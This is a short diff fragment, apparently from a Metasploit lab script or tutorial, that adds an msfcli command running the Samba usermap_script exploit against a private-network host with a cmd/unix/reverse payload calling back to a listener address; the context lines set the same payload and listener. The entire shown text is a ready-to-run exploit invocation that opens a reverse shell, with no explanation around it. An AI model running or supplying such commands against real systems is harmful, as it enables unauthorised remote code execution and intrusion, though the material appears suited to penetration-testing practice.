@@ -7,3 +7,7 @@ set PAYLOAD cmd/unix/reverse;\
 set LHOST 172.16.194.163;\
 
 run"
+;
+
+
+msfcli exploit/multi/samba/usermap_script RHOST=172.16.194.172 PAYLOAD=cmd/unix/reverse LHOST=172.16.194.163 E
